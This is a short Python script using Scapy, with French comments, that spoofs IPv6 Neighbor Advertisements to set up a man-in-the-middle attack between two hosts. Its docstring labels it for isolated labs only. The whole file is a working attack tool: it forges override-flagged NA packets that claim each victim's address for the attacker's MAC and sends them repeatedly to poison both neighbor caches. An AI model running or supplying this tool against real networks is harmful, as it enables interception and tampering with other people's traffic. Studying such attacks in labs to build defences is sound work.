#!/usr/bin/env python3
"""
na_spoof_mitm.py — Usurpation NA pour MITM IPv6. Labo isolé uniquement.
"""
import argparse, time
from scapy.all import Ether, IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr, sendp
def build_na(src_ip, dst_ip, claimed_ip, attacker_mac):
    return (Ether(src=attacker_mac, dst="33:33:00:00:00:01") /
            IPv6(src=src_ip, dst=dst_ip) /
            ICMPv6ND_NA(tgt=claimed_ip, R=0, S=0, O=1) /
            ICMPv6NDOptDstLLAddr(lladdr=attacker_mac))
def main():
    p = argparse.ArgumentParser()
    p.add_argument("--iface", required=True)
    p.add_argument("--victim-a-ip", required=True)
    p.add_argument("--victim-b-ip", required=True)
    p.add_argument("--attacker-mac", required=True)
    p.add_argument("--interval", type=float, default=2.0)
    p.add_argument("--count", type=int, default=0)
    args = p.parse_args()
    pkt_to_b = build_na(args.victim_a_ip, args.victim_b_ip, args.victim_a_ip,
args.attacker_mac)
    pkt_to_a = build_na(args.victim_b_ip, args.victim_a_ip, args.victim_b_ip,
args.attacker_mac)
    sent = 0
    try:
        while args.count == 0 or sent < args.count:
            sendp(pkt_to_b, iface=args.iface, verbose=False)
            sendp(pkt_to_a, iface=args.iface, verbose=False)
            sent += 1
            print(f"[{sent}] NA empoisonnés envoyés")
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("Interruption par l'utilisateur")
    except Exception as e:
        print(f"Erreur: {e}")
    finally:
        print("Nettoyage des ressources...")
if __name__ == "__main__":
    main()
